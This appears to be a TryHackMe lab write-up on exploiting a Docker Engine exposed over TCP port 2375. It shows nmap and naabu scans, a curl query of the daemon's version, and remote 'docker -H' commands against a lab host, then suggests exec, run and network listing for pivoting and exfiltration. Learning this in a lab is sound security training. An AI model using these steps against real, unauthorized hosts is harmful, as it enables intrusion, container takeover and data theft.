---
title: "Red Team Fundamentals"
date: 2024-09-01 07:09:22
categories: [Try-Hack-Me]
tags: [Red Team, THM]
---

## The Docker Engine TCP Sockets Edition

Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this.

Docker can be remotely administrated. For example, using management tools such as [Portainer](https://www.portainer.io/) or [Jenkins](https://www.jenkins.io/) to deploy containers to test their code (yay, automation!).

## The Vulnerability

The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate.

Enumerating: Finding Out if a Device Has Docker Remotely Accessible

By default, the engine will run on **port 2375.** We can confirm this by performing an Nmap scan against your target (10.10.62.80) from your AttackBox.

```
[iamroot@parrot]$ nmap -sV -p 2375 10.10.62.80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 21:37 IST
Nmap scan report for 10.10.62.80
Host is up (0.48s latency).

PORT     STATE SERVICE VERSION
2375/tcp open  docker  Docker 20.10.20 (API 1.41)
Service Info: OS: linux

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds

```



```
[iamroot@parrot]$ naabu -p - 10.10.62.80

                  __
  ___  ___  ___ _/ /  __ __
 / _ \/ _ \/ _ \/ _ \/ // /
/_//_/\_,_/\_,_/_.__/\_,_/ v2.0.5

		projectdiscovery.io

Use with caution. You are responsible for your actions
Developers assume no liability and are not responsible for any misuse or damage.
[INF] Running CONNECT scan with non root privileges
[INF] Found 3 ports on host 10.10.62.80 (10.10.62.80)
10.10.62.80:2222
10.10.62.80:22
10.10.62.80:2375

```

Looks like it's open; we're going to use the `curl` command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: `curl http://10.10.62.80:2375/version`


```
[iamroot@parrot]$ curl http://10.10.62.80:2375/version

{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"20.10.20","Details":{"ApiVersion":"1.41","Arch":"amd64","BuildTime":"2022-10-18T18:18:12.000000000+00:00","Experimental":"false","GitCommit":"03df974","GoVersion":"go1.18.7","KernelVersion":"5.15.0-1022-aws","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.6.8","Details":{"GitCommit":"9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6"}},{"Name":"runc","Version":"1.1.4","Details":{"GitCommit":"v1.1.4-0-g5fd4c4d"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"20.10.20","ApiVersion":"1.41","MinAPIVersion":"1.12","GitCommit":"03df974","GoVersion":"go1.18.7","Os":"linux","Arch":"amd64","KernelVersion":"5.15.0-1022-aws","BuildTime":"2022-10-18T18:18:12.000000000+00:00"}

```

## Executing Docker Commands on Our Target

For this, we'll need to tell our version of Docker to send the command to our target (not our own machine). We can add the "-H" switch to our target. To test if we can run commands, we'll list the containers on the target: `docker -H tcp://10.10.62.80:2`

```
[iamroot@parrot]$ docker -H tcp://10.10.62.80:2375 ps

CONTAINER ID   IMAGE        COMMAND               CREATED        STATUS             PORTS                               NAMES
7b7461f9882e   dockertest   "/usr/sbin/sshd -D"   4 months ago   Up About an hour   0.0.0.0:22->22/tcp, :::22->22/tcp   beautiful_pasteur


```

## What Now

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further. It is worth recalling the commands covered in [Intro to Docker](https://tryhackme.com/room/introtodockerk8pdqk). However, I've included some commands that you may wish to explore:


| **Command  <br>** | **Description  <br>**                                                                                                                         |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| network ls        | Used to list the networks of containers, we could use this <br>to discover other applications running and pivot to them <br>from our machine! |
| images            | List images used by containers; data can also be exfiltrated <br>by reverse-engineering the image.                                            |
| exec              | Execute a command on a container.                                                                                                             |
| run               | Run a container.                                                                                                                              |
